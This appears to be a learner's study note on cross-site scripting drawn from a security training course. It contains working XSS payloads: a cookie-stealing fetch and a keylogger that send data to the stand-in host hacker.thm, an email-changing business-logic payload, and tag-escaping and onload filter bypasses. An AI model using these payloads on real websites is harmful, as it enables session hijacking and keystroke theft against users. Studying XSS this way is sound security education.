title: XSS
---

XSS - _Cross-Site Scripting_ - injecting the malicious JS code ([[knowledge/off-sec/glossary/payload|payload]]) into a web app with hope of being executed by other users.

## Payload

The XSS [payload](knowledge/off-sec/glossary/payload.md) is the JavaScript code we wish to be executed on the targets computer.

%% There are two parts to the payload:

- _The intention_ - it's is what you wish the JavaScript to actually do
- _The modification_ - it's the changes to the code we need to make it execute as every scenario is different %%

## Examples

- Proof of Concept - the demo of achieving XSS on a website
  - `<script>alert('XSS');</script>`
- Stealing user session from Cookies
  - `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- Key logging
  - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- Targeted at the business logic
  - a lot more specific than the examples above
  - calling a particular network resource or a JS fn
    - `<script>user.changeEmail('attacker@hacker.thm');</script>`

## Escaping HTML

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

Let's say, we have a form that takes a name and renders it inside the `input` tag:

```html
<div class="text-center">
  <h2>Hello, <input value="Adam" /></h2>
</div>
```

The JavaScript payload can't run it from inside the `input` tag. We need to escape the `input` tag first so the payload can run properly. We can do this with the following payload:

```
"><script>alert('THM');</script>
```

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

```html
<div class="text-center">
  <h2>
    Hello, <input value="" />
    <script>
      alert("THM");
    </script>
    ">
  </h2>
</div>
```

In case of `textarea`, escaping looks a bit different. We're closing the `textarea` tag first:

```html
<!-- payload -->
</textarea><script>alert("THM");</script>
```

```html
<div class="text-center">
	<h2>Hello, <textarea></textarea><script>alert("THM");</script></textarea></h2>
</div>
```

To get around the filters, we can also take advantage of the additional attributes of the tags, such as the `onload` event of an `img` tag. `onload` executes the code of your choosing once the image specified in the `src` attribute has loaded onto the web page:

```
/images/cat.jpg" onload="alert('THM');` 
```
